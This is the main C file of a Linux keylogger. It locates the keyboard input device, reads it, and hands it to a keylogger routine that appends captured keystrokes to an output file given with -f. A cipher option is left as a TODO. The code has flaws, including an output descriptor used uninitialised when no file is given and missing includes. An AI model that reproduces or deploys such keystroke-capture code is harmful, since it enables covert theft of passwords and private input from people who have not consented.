/*
 * main.c
 *
 *  Created on: 22 abr. 2019
 *      Author: luis
 */

#include <errno.h>
#include <stdio.h>
#include "keylogger.h"
#include "find_keyboard_event.h"


void show_help(char *application_name);


int main(int argc, char *argv[]) {
    char *KEYBOARD_DEVICE = get_keyboard_event_file();

    if (!KEYBOARD_DEVICE) {
		show_help(argv[0]);
    }

    int writeout;
    int keyboard;
	int option = 0, cipher = 0, file = 0;

	char *option_input;
	while ((option = getopt(argc, argv, "c:f:")) != -1) {
		switch (option) {
			case 'c':
				cipher = 1;
				printf("cipher\n");	// TODO
				break;
			case 'f':
				file = 1;
				option_input = optarg;
				break;
			default:
				show_help(argv[0]);
		}
	}

	if (file) {
		if ((writeout = open(option_input, O_WRONLY|O_APPEND|O_CREAT, S_IROTH)) < 0) {
			printf("Error opening file %s: %s\n", argv[2], strerror(errno));
			return 1;
		}
	}

    if ((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0) {
        printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
        return 1;
    }

    keylogger(keyboard, writeout);

    close(keyboard);
    close(writeout);

    free(KEYBOARD_DEVICE);

	return 0;
}

/**
 * Shows keylogger's help 
 */
void show_help(char *application_name) {
    printf("Usage: %s [-f output-file]\n", application_name);
    exit(1);
}
